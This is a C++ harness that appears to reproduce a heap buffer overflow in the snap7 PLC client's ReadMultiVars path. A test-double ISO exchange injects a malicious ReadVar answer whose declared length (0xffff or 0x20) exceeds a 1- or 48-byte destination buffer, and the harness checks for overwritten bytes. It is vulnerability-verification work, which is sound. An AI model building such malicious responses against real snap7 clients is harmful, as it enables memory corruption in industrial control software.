// snap7shell W203 harness: public Cli_ReadMultiVars path against a test-double
// ISO exchange that injects a malicious PLC ReadVar answer into PDU.Payload.
// The vulnerable memcpy in opReadMultiVars is the unmodified upstream source.
#include <cstdio>
#include <cstdlib>
#include <cstring>
#define protected public
#include "s7_micro_client.h"
#undef protected
extern word StubDataLength;
extern byte StubFillByte;
int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "asan";
    word declared = 0xffff;
    int amount = 1;
    size_t dest_size = 1;
    if (!strcmp(mode, "safe")) { declared = 1; }
    if (!strcmp(mode, "bytes")) { declared = 0x20; dest_size = 48; }
    StubDataLength = declared;
    StubFillByte = 0x48;

    unsigned char *dest = (unsigned char *)malloc(dest_size);
    memset(dest, 0xab, dest_size);

    TS7DataItem item;
    memset(&item, 0, sizeof(item));
    item.Area = S7AreaDB;
    item.WordLen = S7WLByte;
    item.DBNumber = 1;
    item.Start = 0;
    item.Amount = amount;
    item.pdata = dest;

    TSnap7MicroClient cli;
    // Negotiation is bypassed by the ISO test double; set the normal 960-byte
    // negotiated PDU size the real Cli_Connect path would have established.
    cli.PDULength = 960;
    int rc = cli.ReadMultiVars(&item, 1);
    printf("mode=%s rc=%d result=%d declared=%u dest_size=%zu",
           mode, rc, item.Result, (unsigned)declared, dest_size);
    if (!strcmp(mode, "bytes"))
        printf(" byte16=0x%02x byte31=0x%02x canary32=0x%02x",
               dest[16], dest[31], dest[32]);
    printf("\n");
    free(dest);
    return 0;
}
